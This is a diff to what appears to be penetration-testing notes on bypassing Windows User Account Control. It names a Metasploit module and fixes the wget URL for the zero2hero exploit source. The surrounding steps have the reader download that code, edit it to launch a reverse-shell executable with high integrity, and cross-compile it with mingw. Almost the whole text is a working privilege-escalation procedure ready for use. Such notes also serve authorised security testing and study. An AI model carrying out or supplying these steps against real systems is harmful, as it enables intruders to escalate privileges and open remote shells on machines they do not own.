@@ -29,10 +29,10 @@ To see if UAC is enabled:
 					Values => 0 or 1
 Automated Method:
 	metasploit => exploit/windows/local/bypassuac_eventvwr
-Manual Bypassing method-1:
+Manual Bypassing method-1:(https://github.com/turbo/zero2hero/)
 	Step-1 - Elevate cmd shell from Medium to High integrity:
 		Usage:
-			wget https://github.com/turbo/zero2hero/main.c
+			wget https://raw.githubusercontent.com/turbo/zero2hero/master/main.c
 			edit main.c:
 				change line "strcat(curPath, "\\foobar.exe");" to "strcat(curPath, "\\revshell.exe");"
 		 	x86_64-w64-mingw32-gcc main.c -o eventvwr-bypassuac-64.exe
